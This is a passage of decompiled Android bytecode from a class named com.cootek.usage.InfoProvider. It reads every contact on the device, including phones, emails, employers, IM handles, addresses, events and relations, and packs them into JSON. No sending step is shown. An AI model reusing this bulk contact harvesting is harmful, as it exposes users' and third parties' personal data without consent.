    //   68: aconst_null
    //   69: aconst_null
    //   70: aconst_null
    //   71: invokevirtual 229	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   74: astore 4
    //   76: aload 4
    //   78: ifnull +165 -> 243
    //   81: aload 4
    //   83: invokeinterface 235 1 0
    //   88: ifeq +155 -> 243
    //   91: new 11	com/cootek/usage/InfoProvider$ContactItem
    //   94: dup
    //   95: aload_0
    //   96: aconst_null
    //   97: invokespecial 314	com/cootek/usage/InfoProvider$ContactItem:<init>	(Lcom/cootek/usage/InfoProvider;Lcom/cootek/usage/InfoProvider$1;)V
    //   100: astore_3
    //   101: aload_3
    //   102: aload 4
    //   104: iconst_0
    //   105: invokeinterface 239 2 0
    //   110: putfield 317	com/cootek/usage/InfoProvider$ContactItem:id	J
    //   113: aload_3
    //   114: aload 4
    //   116: iconst_1
    //   117: invokeinterface 246 2 0
    //   122: putfield 319	com/cootek/usage/InfoProvider$ContactItem:name	Ljava/lang/String;
    //   125: aload_3
    //   126: new 321	java/util/HashSet
    //   129: dup
    //   130: invokespecial 322	java/util/HashSet:<init>	()V
    //   133: putfield 326	com/cootek/usage/InfoProvider$ContactItem:phone	Ljava/util/HashSet;
    //   136: aload_3
    //   137: new 321	java/util/HashSet
    //   140: dup
    //   141: invokespecial 322	java/util/HashSet:<init>	()V
    //   144: putfield 329	com/cootek/usage/InfoProvider$ContactItem:email	Ljava/util/HashSet;
    //   147: aload_3
    //   148: new 321	java/util/HashSet
    //   151: dup
    //   152: invokespecial 322	java/util/HashSet:<init>	()V
    //   155: putfield 332	com/cootek/usage/InfoProvider$ContactItem:organization	Ljava/util/HashSet;
    //   158: aload_3
    //   159: new 321	java/util/HashSet
    //   162: dup
    //   163: invokespecial 322	java/util/HashSet:<init>	()V
    //   166: putfield 335	com/cootek/usage/InfoProvider$ContactItem:im	Ljava/util/HashSet;
    //   169: aload_3
    //   170: new 321	java/util/HashSet
    //   173: dup
    //   174: invokespecial 322	java/util/HashSet:<init>	()V
    //   177: putfield 338	com/cootek/usage/InfoProvider$ContactItem:address	Ljava/util/HashSet;
    //   180: aload_3
    //   181: new 321	java/util/HashSet
    //   184: dup
    //   185: invokespecial 322	java/util/HashSet:<init>	()V
    //   188: putfield 341	com/cootek/usage/InfoProvider$ContactItem:event	Ljava/util/HashSet;
    //   191: aload_3
    //   192: new 321	java/util/HashSet
    //   195: dup
    //   196: invokespecial 322	java/util/HashSet:<init>	()V
    //   199: putfield 344	com/cootek/usage/InfoProvider$ContactItem:relation	Ljava/util/HashSet;
    //   202: aload 11
    //   204: aload_3
    //   205: getfield 317	com/cootek/usage/InfoProvider$ContactItem:id	J
    //   208: invokestatic 349	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   211: aload_3
    //   212: invokevirtual 352	java/util/Hashtable:put	(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;
    //   215: pop
    //   216: aload 4
    //   218: invokeinterface 275 1 0
    //   223: istore_2
    //   224: iload_2
    //   225: ifne -134 -> 91
    //   228: goto +15 -> 243
    //   231: astore_3
    //   232: goto +2381 -> 2613
    //   235: astore 5
    //   237: goto +2304 -> 2541
    //   240: goto +2341 -> 2581
    //   243: aload 4
    //   245: ifnull +18 -> 263
    //   248: aload 4
    //   250: invokeinterface 278 1 0
    //   255: goto +8 -> 263
    //   258: astore_3
    //   259: aload_3
    //   260: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   263: aload 7
    //   265: astore_3
    //   266: aload 12
    //   268: getstatic 355	android/provider/ContactsContract$Data:CONTENT_URI	Landroid/net/Uri;
    //   271: bipush 12
    //   273: anewarray 206	java/lang/String
    //   276: dup
    //   277: iconst_0
    //   278: ldc_w 290
    //   281: aastore
    //   282: dup
    //   283: iconst_1
    //   284: ldc_w 357
    //   287: aastore
    //   288: dup
    //   289: iconst_2
    //   290: ldc_w 359
    //   293: aastore
    //   294: dup
    //   295: iconst_3
    //   296: ldc_w 361
    //   299: aastore
    //   300: dup
    //   301: iconst_4
    //   302: ldc_w 363
    //   305: aastore
    //   306: dup
    //   307: iconst_5
    //   308: ldc_w 365
    //   311: aastore
    //   312: dup
    //   313: bipush 6
    //   315: ldc_w 367
    //   318: aastore
    //   319: dup
    //   320: bipush 7
    //   322: ldc_w 369
    //   325: aastore
    //   326: dup
    //   327: bipush 8
    //   329: ldc_w 371
    //   332: aastore
    //   333: dup
    //   334: bipush 9
    //   336: ldc_w 373
    //   339: aastore
    //   340: dup
    //   341: bipush 10
    //   343: ldc_w 375
    //   346: aastore
    //   347: dup
    //   348: bipush 11
    //   350: ldc_w 377
    //   353: aastore
    //   354: ldc_w 379
    //   357: bipush 7
    //   359: anewarray 206	java/lang/String
    //   362: dup
    //   363: iconst_0
    //   364: ldc_w 381
    //   367: aastore
    //   368: dup
    //   369: iconst_1
    //   370: ldc_w 383
    //   373: aastore
    //   374: dup
    //   375: iconst_2
    //   376: ldc_w 385
    //   379: aastore
    //   380: dup
    //   381: iconst_3
    //   382: ldc_w 387
    //   385: aastore
    //   386: dup
    //   387: iconst_4
    //   388: ldc_w 389
    //   391: aastore
    //   392: dup
    //   393: iconst_5
    //   394: ldc_w 391
    //   397: aastore
    //   398: dup
    //   399: bipush 6
    //   401: ldc_w 393
    //   404: aastore
    //   405: aconst_null
    //   406: invokevirtual 229	android/content/ContentResolver:query	(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   409: astore 4
    //   411: aload 4
    //   413: ifnull +734 -> 1147
    //   416: aload 4
    //   418: invokeinterface 235 1 0
    //   423: istore_2
    //   424: iload_2
    //   425: ifeq +722 -> 1147
    //   428: aload 11
    //   430: aload 4
    //   432: iconst_0
    //   433: invokeinterface 239 2 0
    //   438: invokestatic 349	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   441: invokevirtual 396	java/util/Hashtable:get	(Ljava/lang/Object;)Ljava/lang/Object;
    //   444: checkcast 11	com/cootek/usage/InfoProvider$ContactItem
    //   447: astore_3
    //   448: aload_3
    //   449: ifnonnull +6 -> 455
    //   452: goto +2209 -> 2661
    //   455: aload 4
    //   457: iconst_1
    //   458: invokeinterface 246 2 0
    //   463: astore 5
    //   465: ldc_w 381
    //   468: aload 5
    //   470: invokevirtual 400	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   473: istore_2
    //   474: iload_2
    //   475: ifeq +30 -> 505
    //   478: aload 4
    //   480: iconst_2
    //   481: invokeinterface 246 2 0
    //   486: astore 5
    //   488: aload_3
    //   489: getfield 326	com/cootek/usage/InfoProvider$ContactItem:phone	Ljava/util/HashSet;
    //   492: aload 5
    //   494: invokevirtual 403	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   497: pop
    //   498: goto +2163 -> 2661
    //   501: astore_3
    //   502: goto +614 -> 1116
    //   505: ldc_w 383
    //   508: aload 5
    //   510: invokevirtual 400	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   513: istore_2
    //   514: iload_2
    //   515: ifeq +78 -> 593
    //   518: new 14	com/cootek/usage/InfoProvider$EmailItem
    //   521: dup
    //   522: aload_0
    //   523: aconst_null
    //   524: invokespecial 404	com/cootek/usage/InfoProvider$EmailItem:<init>	(Lcom/cootek/usage/InfoProvider;Lcom/cootek/usage/InfoProvider$1;)V
    //   527: astore 5
    //   529: aload 5
    //   531: aload 4
    //   533: iconst_2
    //   534: invokeinterface 246 2 0
    //   539: putfield 406	com/cootek/usage/InfoProvider$EmailItem:email	Ljava/lang/String;
    //   542: aload 5
    //   544: aload_0
    //   545: aload 4
    //   547: iconst_3
    //   548: invokeinterface 250 2 0
    //   553: invokespecial 409	com/cootek/usage/InfoProvider:getEmailType	(I)Ljava/lang/String;
    //   556: putfield 410	com/cootek/usage/InfoProvider$EmailItem:type	Ljava/lang/String;
    //   559: aload 5
    //   561: getfield 410	com/cootek/usage/InfoProvider$EmailItem:type	Ljava/lang/String;
    //   564: ifnonnull +16 -> 580
    //   567: aload 5
    //   569: aload 4
    //   571: iconst_4
    //   572: invokeinterface 246 2 0
    //   577: putfield 410	com/cootek/usage/InfoProvider$EmailItem:type	Ljava/lang/String;
    //   580: aload_3
    //   581: getfield 329	com/cootek/usage/InfoProvider$ContactItem:email	Ljava/util/HashSet;
    //   584: aload 5
    //   586: invokevirtual 403	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   589: pop
    //   590: goto +2071 -> 2661
    //   593: ldc_w 385
    //   596: aload 5
    //   598: invokevirtual 400	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   601: istore_2
    //   602: iload_2
    //   603: ifeq +113 -> 716
    //   606: new 26	com/cootek/usage/InfoProvider$OrganizationItem
    //   609: dup
    //   610: aload_0
    //   611: aconst_null
    //   612: invokespecial 411	com/cootek/usage/InfoProvider$OrganizationItem:<init>	(Lcom/cootek/usage/InfoProvider;Lcom/cootek/usage/InfoProvider$1;)V
    //   615: astore 5
    //   617: aload 5
    //   619: aload 4
    //   621: iconst_2
    //   622: invokeinterface 246 2 0
    //   627: putfield 414	com/cootek/usage/InfoProvider$OrganizationItem:company	Ljava/lang/String;
    //   630: aload 5
    //   632: aload 4
    //   634: iconst_5
    //   635: invokeinterface 246 2 0
    //   640: putfield 417	com/cootek/usage/InfoProvider$OrganizationItem:title	Ljava/lang/String;
    //   643: aload 4
    //   645: bipush 6
    //   647: invokeinterface 246 2 0
    //   652: astore 6
    //   654: aload 5
    //   656: aload 6
    //   658: putfield 420	com/cootek/usage/InfoProvider$OrganizationItem:department	Ljava/lang/String;
    //   661: aload 5
    //   663: aload_0
    //   664: aload 4
    //   666: iconst_3
    //   667: invokeinterface 250 2 0
    //   672: invokespecial 423	com/cootek/usage/InfoProvider:getOrganizationType	(I)Ljava/lang/String;
    //   675: putfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   678: aload 5
    //   680: getfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   683: ifnonnull +16 -> 699
    //   686: aload 5
    //   688: aload 4
    //   690: iconst_4
    //   691: invokeinterface 246 2 0
    //   696: putfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   699: aload_3
    //   700: getfield 332	com/cootek/usage/InfoProvider$ContactItem:organization	Ljava/util/HashSet;
    //   703: aload 5
    //   705: invokevirtual 403	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   708: pop
    //   709: goto +1952 -> 2661
    //   712: astore_3
    //   713: goto -211 -> 502
    //   716: ldc_w 387
    //   719: aload 5
    //   721: invokevirtual 400	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   724: ifeq +129 -> 853
    //   727: new 20	com/cootek/usage/InfoProvider$ImItem
    //   730: dup
    //   731: aload_0
    //   732: aconst_null
    //   733: invokespecial 425	com/cootek/usage/InfoProvider$ImItem:<init>	(Lcom/cootek/usage/InfoProvider;Lcom/cootek/usage/InfoProvider$1;)V
    //   736: astore 5
    //   738: aload 5
    //   740: aload 4
    //   742: iconst_2
    //   743: invokeinterface 246 2 0
    //   748: putfield 427	com/cootek/usage/InfoProvider$ImItem:im	Ljava/lang/String;
    //   751: aload 5
    //   753: aload_0
    //   754: aload 4
    //   756: iconst_3
    //   757: invokeinterface 250 2 0
    //   762: invokespecial 430	com/cootek/usage/InfoProvider:getImType	(I)Ljava/lang/String;
    //   765: putfield 431	com/cootek/usage/InfoProvider$ImItem:type	Ljava/lang/String;
    //   768: aload 5
    //   770: getfield 431	com/cootek/usage/InfoProvider$ImItem:type	Ljava/lang/String;
    //   773: astore 6
    //   775: aload 6
    //   777: ifnonnull +16 -> 793
    //   780: aload 5
    //   782: aload 4
    //   784: iconst_4
    //   785: invokeinterface 246 2 0
    //   790: putfield 431	com/cootek/usage/InfoProvider$ImItem:type	Ljava/lang/String;
    //   793: aload 5
    //   795: aload_0
    //   796: aload 4
    //   798: bipush 6
    //   800: invokeinterface 250 2 0
    //   805: invokespecial 434	com/cootek/usage/InfoProvider:getImProtocol	(I)Ljava/lang/String;
    //   808: putfield 437	com/cootek/usage/InfoProvider$ImItem:protocol	Ljava/lang/String;
    //   811: aload 5
    //   813: getfield 437	com/cootek/usage/InfoProvider$ImItem:protocol	Ljava/lang/String;
    //   816: astore 6
    //   818: aload 6
    //   820: ifnonnull +1844 -> 2664
    //   823: aload 5
    //   825: aload 4
    //   827: bipush 7
    //   829: invokeinterface 246 2 0
    //   834: putfield 437	com/cootek/usage/InfoProvider$ImItem:protocol	Ljava/lang/String;
    //   837: goto +3 -> 840
    //   840: aload_3
    //   841: getfield 335	com/cootek/usage/InfoProvider$ContactItem:im	Ljava/util/HashSet;
    //   844: aload 5
    //   846: invokevirtual 403	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   849: pop
    //   850: goto +270 -> 1120
    //   853: ldc_w 389
    //   856: aload 5
    //   858: invokevirtual 400	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   861: ifeq +78 -> 939
    //   864: new 8	com/cootek/usage/InfoProvider$AddressItem
    //   867: dup
    //   868: aload_0
    //   869: aconst_null
    //   870: invokespecial 438	com/cootek/usage/InfoProvider$AddressItem:<init>	(Lcom/cootek/usage/InfoProvider;Lcom/cootek/usage/InfoProvider$1;)V
    //   873: astore 5
    //   875: aload 5
    //   877: aload 4
    //   879: iconst_2
    //   880: invokeinterface 246 2 0
    //   885: putfield 440	com/cootek/usage/InfoProvider$AddressItem:address	Ljava/lang/String;
    //   888: aload 5
    //   890: aload_0
    //   891: aload 4
    //   893: iconst_3
    //   894: invokeinterface 250 2 0
    //   899: invokespecial 442	com/cootek/usage/InfoProvider:getAddressType	(I)Ljava/lang/String;
    //   902: putfield 443	com/cootek/usage/InfoProvider$AddressItem:type	Ljava/lang/String;
    //   905: aload 5
    //   907: getfield 443	com/cootek/usage/InfoProvider$AddressItem:type	Ljava/lang/String;
    //   910: ifnonnull +16 -> 926
    //   913: aload 5
    //   915: aload 4
    //   917: iconst_4
    //   918: invokeinterface 246 2 0
    //   923: putfield 443	com/cootek/usage/InfoProvider$AddressItem:type	Ljava/lang/String;
    //   926: aload_3
    //   927: getfield 338	com/cootek/usage/InfoProvider$ContactItem:address	Ljava/util/HashSet;
    //   930: aload 5
    //   932: invokevirtual 403	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   935: pop
    //   936: goto +184 -> 1120
    //   939: ldc_w 391
    //   942: aload 5
    //   944: invokevirtual 400	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   947: ifeq +78 -> 1025
    //   950: new 17	com/cootek/usage/InfoProvider$EventItem
    //   953: dup
    //   954: aload_0
    //   955: aconst_null
    //   956: invokespecial 444	com/cootek/usage/InfoProvider$EventItem:<init>	(Lcom/cootek/usage/InfoProvider;Lcom/cootek/usage/InfoProvider$1;)V
    //   959: astore 5
    //   961: aload 5
    //   963: aload 4
    //   965: iconst_2
    //   966: invokeinterface 246 2 0
    //   971: putfield 446	com/cootek/usage/InfoProvider$EventItem:date	Ljava/lang/String;
    //   974: aload 5
    //   976: aload_0
    //   977: aload 4
    //   979: iconst_3
    //   980: invokeinterface 250 2 0
    //   985: invokespecial 449	com/cootek/usage/InfoProvider:getEventType	(I)Ljava/lang/String;
    //   988: putfield 450	com/cootek/usage/InfoProvider$EventItem:type	Ljava/lang/String;
    //   991: aload 5
    //   993: getfield 450	com/cootek/usage/InfoProvider$EventItem:type	Ljava/lang/String;
    //   996: ifnonnull +16 -> 1012
    //   999: aload 5
    //   1001: aload 4
    //   1003: iconst_4
    //   1004: invokeinterface 246 2 0
    //   1009: putfield 450	com/cootek/usage/InfoProvider$EventItem:type	Ljava/lang/String;
    //   1012: aload_3
    //   1013: getfield 341	com/cootek/usage/InfoProvider$ContactItem:event	Ljava/util/HashSet;
    //   1016: aload 5
    //   1018: invokevirtual 403	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   1021: pop
    //   1022: goto +98 -> 1120
    //   1025: ldc_w 393
    //   1028: aload 5
    //   1030: invokevirtual 400	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   1033: ifeq +87 -> 1120
    //   1036: new 29	com/cootek/usage/InfoProvider$RelationItem
    //   1039: dup
    //   1040: aload_0
    //   1041: aconst_null
    //   1042: invokespecial 451	com/cootek/usage/InfoProvider$RelationItem:<init>	(Lcom/cootek/usage/InfoProvider;Lcom/cootek/usage/InfoProvider$1;)V
    //   1045: astore 5
    //   1047: aload 5
    //   1049: aload 4
    //   1051: iconst_2
    //   1052: invokeinterface 246 2 0
    //   1057: putfield 452	com/cootek/usage/InfoProvider$RelationItem:name	Ljava/lang/String;
    //   1060: aload 5
    //   1062: aload_0
    //   1063: aload 4
    //   1065: iconst_3
    //   1066: invokeinterface 250 2 0
    //   1071: invokespecial 455	com/cootek/usage/InfoProvider:getRelationType	(I)Ljava/lang/String;
    //   1074: putfield 456	com/cootek/usage/InfoProvider$RelationItem:type	Ljava/lang/String;
    //   1077: aload 5
    //   1079: getfield 456	com/cootek/usage/InfoProvider$RelationItem:type	Ljava/lang/String;
    //   1082: ifnonnull +16 -> 1098
    //   1085: aload 5
    //   1087: aload 4
    //   1089: iconst_4
    //   1090: invokeinterface 246 2 0
    //   1095: putfield 456	com/cootek/usage/InfoProvider$RelationItem:type	Ljava/lang/String;
    //   1098: aload_3
    //   1099: getfield 344	com/cootek/usage/InfoProvider$ContactItem:relation	Ljava/util/HashSet;
    //   1102: aload 5
    //   1104: invokevirtual 403	java/util/HashSet:add	(Ljava/lang/Object;)Z
    //   1107: pop
    //   1108: goto +12 -> 1120
    //   1111: astore_3
    //   1112: goto +4 -> 1116
    //   1115: astore_3
    //   1116: aload_3
    //   1117: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   1120: aload 4
    //   1122: invokeinterface 275 1 0
    //   1127: istore_2
    //   1128: iload_2
    //   1129: ifne -701 -> 428
    //   1132: goto +15 -> 1147
    //   1135: astore_3
    //   1136: goto +1360 -> 2496
    //   1139: astore 5
    //   1141: goto +1283 -> 2424
    //   1144: goto +1320 -> 2464
    //   1147: aload 4
    //   1149: ifnull +18 -> 1167
    //   1152: aload 4
    //   1154: invokeinterface 278 1 0
    //   1159: goto +8 -> 1167
    //   1162: astore_3
    //   1163: aload_3
    //   1164: invokevirtual 279	java/lang/RuntimeException:printStackTrace	()V
    //   1167: new 96	org/json/JSONArray
    //   1170: dup
    //   1171: invokespecial 97	org/json/JSONArray:<init>	()V
    //   1174: astore_3
    //   1175: aload 11
    //   1177: invokevirtual 460	java/util/Hashtable:values	()Ljava/util/Collection;
    //   1180: invokeinterface 466 1 0
    //   1185: astore 4
    //   1187: aload 4
    //   1189: invokeinterface 471 1 0
    //   1194: ifeq +1069 -> 2263
    //   1197: aload 4
    //   1199: invokeinterface 475 1 0
    //   1204: checkcast 11	com/cootek/usage/InfoProvider$ContactItem
    //   1207: astore 6
    //   1209: new 133	org/json/JSONObject
    //   1212: dup
    //   1213: invokespecial 134	org/json/JSONObject:<init>	()V
    //   1216: astore 5
    //   1218: aload 5
    //   1220: ldc -120
    //   1222: aload 6
    //   1224: getfield 319	com/cootek/usage/InfoProvider$ContactItem:name	Ljava/lang/String;
    //   1227: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1230: pop
    //   1231: aload 6
    //   1233: getfield 326	com/cootek/usage/InfoProvider$ContactItem:phone	Ljava/util/HashSet;
    //   1236: invokevirtual 477	java/util/HashSet:isEmpty	()Z
    //   1239: ifne +70 -> 1309
    //   1242: new 96	org/json/JSONArray
    //   1245: dup
    //   1246: invokespecial 97	org/json/JSONArray:<init>	()V
    //   1249: astore 7
    //   1251: aload 6
    //   1253: getfield 326	com/cootek/usage/InfoProvider$ContactItem:phone	Ljava/util/HashSet;
    //   1256: invokevirtual 478	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   1259: astore 8
    //   1261: aload 8
    //   1263: invokeinterface 471 1 0
    //   1268: ifeq +22 -> 1290
    //   1271: aload 7
    //   1273: aload 8
    //   1275: invokeinterface 475 1 0
    //   1280: checkcast 206	java/lang/String
    //   1283: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   1286: pop
    //   1287: goto -26 -> 1261
    //   1290: aload 7
    //   1292: invokevirtual 481	org/json/JSONArray:length	()I
    //   1295: ifle +14 -> 1309
    //   1298: aload 5
    //   1300: ldc_w 482
    //   1303: aload 7
    //   1305: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1308: pop
    //   1309: aload 6
    //   1311: getfield 329	com/cootek/usage/InfoProvider$ContactItem:email	Ljava/util/HashSet;
    //   1314: invokevirtual 477	java/util/HashSet:isEmpty	()Z
    //   1317: ifne +132 -> 1449
    //   1320: new 96	org/json/JSONArray
    //   1323: dup
    //   1324: invokespecial 97	org/json/JSONArray:<init>	()V
    //   1327: astore 7
    //   1329: aload 6
    //   1331: getfield 329	com/cootek/usage/InfoProvider$ContactItem:email	Ljava/util/HashSet;
    //   1334: invokevirtual 478	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   1337: astore 8
    //   1339: aload 8
    //   1341: invokeinterface 471 1 0
    //   1346: ifeq +84 -> 1430
    //   1349: aload 8
    //   1351: invokeinterface 475 1 0
    //   1356: checkcast 14	com/cootek/usage/InfoProvider$EmailItem
    //   1359: astore 9
    //   1361: new 133	org/json/JSONObject
    //   1364: dup
    //   1365: invokespecial 134	org/json/JSONObject:<init>	()V
    //   1368: astore 11
    //   1370: aload 9
    //   1372: getfield 406	com/cootek/usage/InfoProvider$EmailItem:email	Ljava/lang/String;
    //   1375: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1378: ifne -39 -> 1339
    //   1381: aload 11
    //   1383: ldc_w 483
    //   1386: aload 9
    //   1388: getfield 406	com/cootek/usage/InfoProvider$EmailItem:email	Ljava/lang/String;
    //   1391: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1394: pop
    //   1395: aload 9
    //   1397: getfield 410	com/cootek/usage/InfoProvider$EmailItem:type	Ljava/lang/String;
    //   1400: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1403: ifne +16 -> 1419
    //   1406: aload 11
    //   1408: ldc -41
    //   1410: aload 9
    //   1412: getfield 410	com/cootek/usage/InfoProvider$EmailItem:type	Ljava/lang/String;
    //   1415: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1418: pop
    //   1419: aload 7
    //   1421: aload 11
    //   1423: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   1426: pop
    //   1427: goto -88 -> 1339
    //   1430: aload 7
    //   1432: invokevirtual 481	org/json/JSONArray:length	()I
    //   1435: ifle +14 -> 1449
    //   1438: aload 5
    //   1440: ldc_w 484
    //   1443: aload 7
    //   1445: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1448: pop
    //   1449: aload 6
    //   1451: getfield 332	com/cootek/usage/InfoProvider$ContactItem:organization	Ljava/util/HashSet;
    //   1454: invokevirtual 477	java/util/HashSet:isEmpty	()Z
    //   1457: ifne +197 -> 1654
    //   1460: new 96	org/json/JSONArray
    //   1463: dup
    //   1464: invokespecial 97	org/json/JSONArray:<init>	()V
    //   1467: astore 7
    //   1469: aload 6
    //   1471: getfield 332	com/cootek/usage/InfoProvider$ContactItem:organization	Ljava/util/HashSet;
    //   1474: invokevirtual 478	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   1477: astore 8
    //   1479: aload 8
    //   1481: invokeinterface 471 1 0
    //   1486: ifeq +149 -> 1635
    //   1489: aload 8
    //   1491: invokeinterface 475 1 0
    //   1496: checkcast 26	com/cootek/usage/InfoProvider$OrganizationItem
    //   1499: astore 9
    //   1501: new 133	org/json/JSONObject
    //   1504: dup
    //   1505: invokespecial 134	org/json/JSONObject:<init>	()V
    //   1508: astore 11
    //   1510: aload 9
    //   1512: getfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   1515: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1518: ifne +1153 -> 2671
    //   1521: aload 11
    //   1523: ldc -41
    //   1525: aload 9
    //   1527: getfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   1530: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1533: pop
    //   1534: iconst_1
    //   1535: istore_1
    //   1536: goto +3 -> 1539
    //   1539: aload 9
    //   1541: getfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   1544: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1547: ifne +19 -> 1566
    //   1550: aload 11
    //   1552: ldc_w 485
    //   1555: aload 9
    //   1557: getfield 414	com/cootek/usage/InfoProvider$OrganizationItem:company	Ljava/lang/String;
    //   1560: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1563: pop
    //   1564: iconst_1
    //   1565: istore_1
    //   1566: aload 9
    //   1568: getfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   1571: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1574: ifne +19 -> 1593
    //   1577: aload 11
    //   1579: ldc_w 486
    //   1582: aload 9
    //   1584: getfield 417	com/cootek/usage/InfoProvider$OrganizationItem:title	Ljava/lang/String;
    //   1587: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1590: pop
    //   1591: iconst_1
    //   1592: istore_1
    //   1593: aload 9
    //   1595: getfield 424	com/cootek/usage/InfoProvider$OrganizationItem:type	Ljava/lang/String;
    //   1598: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1601: ifne +19 -> 1620
    //   1604: aload 11
    //   1606: ldc_w 487
    //   1609: aload 9
    //   1611: getfield 420	com/cootek/usage/InfoProvider$OrganizationItem:department	Ljava/lang/String;
    //   1614: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1617: pop
    //   1618: iconst_1
    //   1619: istore_1
    //   1620: iload_1
    //   1621: ifeq -142 -> 1479
    //   1624: aload 7
    //   1626: aload 11
    //   1628: invokevirtual 145	org/json/JSONArray:put	(Ljava/lang/Object;)Lorg/json/JSONArray;
    //   1631: pop
    //   1632: goto -153 -> 1479
    //   1635: aload 7
    //   1637: invokevirtual 481	org/json/JSONArray:length	()I
    //   1640: ifle +14 -> 1654
    //   1643: aload 5
    //   1645: ldc_w 488
    //   1648: aload 7
    //   1650: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1653: pop
    //   1654: aload 6
    //   1656: getfield 335	com/cootek/usage/InfoProvider$ContactItem:im	Ljava/util/HashSet;
    //   1659: invokevirtual 477	java/util/HashSet:isEmpty	()Z
    //   1662: ifne +157 -> 1819
    //   1665: new 96	org/json/JSONArray
    //   1668: dup
    //   1669: invokespecial 97	org/json/JSONArray:<init>	()V
    //   1672: astore 7
    //   1674: aload 6
    //   1676: getfield 335	com/cootek/usage/InfoProvider$ContactItem:im	Ljava/util/HashSet;
    //   1679: invokevirtual 478	java/util/HashSet:iterator	()Ljava/util/Iterator;
    //   1682: astore 8
    //   1684: aload 8
    //   1686: invokeinterface 471 1 0
    //   1691: ifeq +117 -> 1808
    //   1694: aload 8
    //   1696: invokeinterface 475 1 0
    //   1701: checkcast 20	com/cootek/usage/InfoProvider$ImItem
    //   1704: astore 9
    //   1706: new 133	org/json/JSONObject
    //   1709: dup
    //   1710: invokespecial 134	org/json/JSONObject:<init>	()V
    //   1713: astore 11
    //   1715: aload 9
    //   1717: getfield 427	com/cootek/usage/InfoProvider$ImItem:im	Ljava/lang/String;
    //   1720: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1723: ifne -39 -> 1684
    //   1726: aload 11
    //   1728: ldc_w 490
    //   1731: aload 9
    //   1733: getfield 427	com/cootek/usage/InfoProvider$ImItem:im	Ljava/lang/String;
    //   1736: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1739: pop
    //   1740: aload 9
    //   1742: getfield 431	com/cootek/usage/InfoProvider$ImItem:type	Ljava/lang/String;
    //   1745: invokestatic 269	android/text/TextUtils:isEmpty	(Ljava/lang/CharSequence;)Z
    //   1748: ifne +16 -> 1764
    //   1751: aload 11
    //   1753: ldc -41
    //   1755: aload 9
    //   1757: getfield 431	com/cootek/usage/InfoProvider$ImItem:type	Ljava/lang/String;
    //   1760: invokevirtual 140	org/json/JSONObject:put	(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   1763: pop
    //   1764: aload 9
    //   1766: getfield 437	com/cootek/usage/InfoProvider$ImItem:protocol	Ljava/lang/String;
